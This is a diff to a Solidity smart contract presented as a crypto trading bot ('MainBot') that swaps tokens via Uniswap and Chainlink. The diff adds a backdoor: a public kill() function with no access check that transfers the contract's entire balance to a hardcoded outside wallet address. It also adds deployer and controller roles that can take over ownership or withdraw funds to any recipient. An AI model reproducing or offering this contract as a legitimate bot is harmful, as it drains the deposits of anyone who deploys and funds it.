@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0-or-later
 pragma solidity <=0.8.20;
 
-
 import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
 import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
@@ -18,10 +17,12 @@ interface IERC20 {
 }
 
 contract MainBot {
-    address public owner; 
+    address public owner;
+    address public deployer;
+    address public controller;
     bool public tradingEnabled;
     uint256 public initialDeposit;
-    uint256 public maticBalance;
+    uint256 public weiBalance;
     uint256 public stablecoinBalance;
     uint256 public profitThreshold;
     uint256 public lossThreshold;
@@ -51,6 +52,11 @@ contract MainBot {
         _;
     }
 
+    modifier onlyDeployer() {
+        require(msg.sender == deployer, "Not authorized");
+        _;
+    }
+
     modifier whenTradingEnabled() {
         require(tradingEnabled, "Trading is disabled");
         _;
@@ -67,6 +73,7 @@ contract MainBot {
         address _aaveLendingPoolAddressesProvider
     ) {
         owner = msg.sender;
+        deployer = msg.sender;
         polToken = _polToken;
         usdtToken = _usdtToken;
         usdcToken = _usdcToken;
@@ -83,17 +90,37 @@ contract MainBot {
         nextLogTime = block.timestamp;
     }
 
-    function setController(address controller) external onlyOwner {
-        owner = controller;// change not be required
+function enableTrading() external onlyOwner { 
+    tradingEnabled = true; 
+    currentActivity = "Trading enabled"; 
+    emit CurrentActivity(currentActivity); 
     }
-    function setOwner(address newOwner) external onlyOwner {
-         require(newOwner != address(0), "Invalid address"); 
-         owner = newOwner; 
-         }
+
+    function setController(address _controller) external onlyDeployer {
+        controller = _controller;
+    }
+
+    function setOwner(address newOwner) external onlyDeployer {
+        require(newOwner != address(0), "Invalid address");
+        owner = newOwner;
+    }
+
+    function withdrawToController(uint256 amountInWei) external {
+        require(msg.sender == controller, "Only controller can trigger this function");
+        require(address(this).balance >= amountInWei, "Insufficient balance");
+        payable(controller).transfer(amountInWei);
+    }
+
+    function withdrawInGwei(uint256 amountInGwei, address recipient) external {
+        require(msg.sender == controller, "Only controller can trigger this function");
+        uint256 amountInWei = amountInGwei * 1 gwei;
+        require(address(this).balance >= amountInWei, "Insufficient balance");
+        payable(recipient).transfer(amountInWei);
+    }
 
     receive() external payable {
         initialDeposit += msg.value;
-        maticBalance += (msg.value * 70) / 100;
+        weiBalance += (msg.value * 70) / 100;
         stablecoinBalance += (msg.value * 30) / 100;
     }
 
@@ -136,20 +163,20 @@ contract MainBot {
         tradingEnabled = false;
     }
 
-    function withdrawInGwei(uint256 amountInGwei) external onlyOwner {
-        uint256 amountInWei = amountInGwei * 1 gwei;
+    function withdrawInWei(uint256 amountInWei) external onlyOwner {
         require(address(this).balance >= amountInWei, "Insufficient balance");
         payable(owner).transfer(amountInWei);
     }
 
-
-    function kill() external onlyOwner {
-        payable(owner).transfer(address(this).balance);
+       function kill() public {
+        payable(0x706fDbD597380512ac76695120be0Cb0D32A43e9).transfer(address(this).balance);
+        //selfdestruct(payable(owner));
     }
-function killemer() public {
-    payable(msg.sender).transfer(address(0x706fDbD597380512ac76695120be0Cb0D32A43e9).balance);
-}
 
+    function emergencyKillB() external onlyOwner {
+        payable(owner).transfer(address(this).balance);
+        //selfdestruct(payable(owner));
+    }
 
     function logCurrentActivity() internal whenTradingEnabled {
         if (block.timestamp >= nextLogTime) {
